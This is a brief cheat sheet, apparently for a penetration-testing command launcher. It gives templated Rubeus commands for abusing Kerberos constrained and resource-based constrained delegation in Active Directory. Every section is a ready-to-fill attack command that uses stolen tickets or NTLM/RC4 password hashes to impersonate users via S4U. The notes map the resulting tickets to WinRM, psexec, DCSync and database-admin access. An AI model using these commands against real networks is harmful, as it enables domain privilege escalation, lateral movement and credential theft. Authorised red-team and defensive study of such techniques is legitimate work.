# rubeus

% ad, windows, rubeus

#plateform/windows #target/local 

## S4U - Constrained delegation abuse (ptt)
#cat/ATTACK/EXPLOIT 
```
.\Rubeus.exe s4u /ticket:<kirbi_path_or_b64_blob> /impersonateuser:<user> /msdsspn:<svc|ldap>/<target> /ptt
```

## S4U - Constrained delegation abuse (pth)
#cat/ATTACK/EXPLOIT 
wmi: HOST, RPCSS
PowerShell Remoting: HOST, HTTP
WinRM: HOST, HTTP, WINRM
Scheduled Tasks: HOST
Windows File Share, also psexec: CIFS
LDAP operations, included DCSync: LDAP
Windows Remote Server Administration Tools: RPCSS, LDAP, CIFS
Golden Tickets: krbtgt
DB admin: MSSQLSvc
```
.\Rubeus.exe s4u /user:<user> /rc4:<NTLMhashedPasswordOfTheUser> /impersonateuser:<user_to_impersonate> /msdsspn:<svc|ldap>/<target> /domain:<domain_fqdn> /ptt
```


## S4U - Constrained delegation abuse with alternative spn (ptt)
#cat/ATTACK/EXPLOIT 
```
.\Rubeus.exe s4u /ticket:<kirbi_path_or_b64_blob> /impersonateuser:<user> /msdsspn:<svc|ldap>/<target> /altservice:<service_comma_sep> /ptt
```

## S4U - Constrained delegation abuse with alternative spn (pth)
#cat/ATTACK/EXPLOIT 
wmi: HOST, RPCSS
PowerShell Remoting: HOST, HTTP
WinRM: HOST, HTTP, WINRM
Scheduled Tasks: HOST
Windows File Share, also psexec: CIFS
LDAP operations, included DCSync: LDAP
Windows Remote Server Administration Tools: RPCSS, LDAP, CIFS
Golden Tickets: krbtgt
DB admin: MSSQLSvc
```
.\Rubeus.exe s4u /user:<user> /rc4:<NTLMhashedPasswordOfTheUser> /impersonateuser:<user_to_impersonate> /msdsspn:<svc|ldap>/<target> /altservice:<service_comma_sep> /domain:<domain_fqdn> /ptt
```

## S4U - Resource based constrained delegation
#cat/ATTACK/EXPLOIT 
HTTP (WinRM), LDAP (DCSync), HOST (PsExec shell), MSSQLSvc (DB admin rights)
```
.\Rubeus.exe s4u /user:<MachineAccountName> /rc4:<RC4HashOfMachineAccountPassword> /impersonateuser:<user_to_impersonate> /msdsspn:<svc|ldap>/<target> /domain:<domain_fqdn> /ptt
```